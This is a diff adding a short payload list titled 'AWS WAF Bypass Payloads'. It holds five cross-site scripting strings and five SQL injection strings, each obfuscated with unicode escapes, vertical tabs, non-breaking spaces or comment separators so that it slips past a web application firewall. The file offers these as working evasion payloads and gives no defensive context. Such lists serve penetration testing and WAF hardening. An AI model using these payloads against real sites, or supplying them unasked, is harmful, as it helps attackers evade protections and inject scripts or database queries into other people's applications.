@@ -1,0 +1,13 @@
+# AWS WAF Bypass Payloads
+# XSS
+<img src=1 onerror\x0b=alert(1)>
+<svg/onload=\u0061lert(1)>
+<img/src/onerror=alert(1)>
+<svg><script>al\u0065rt(1)</script>
+<img src=x onerror=window['alert'](1)>
+# SQLi
+1'%0bOR%0b'1'='1
+1'%0cUNION%0cSELECT%0c1,2,3--
+1'/**/oR/**/1=1--
+1'%a0UNION%a0SELECT%a01,2,3--
+-1'%20UNION%20ALL%20SELECT%201,@@version,3--
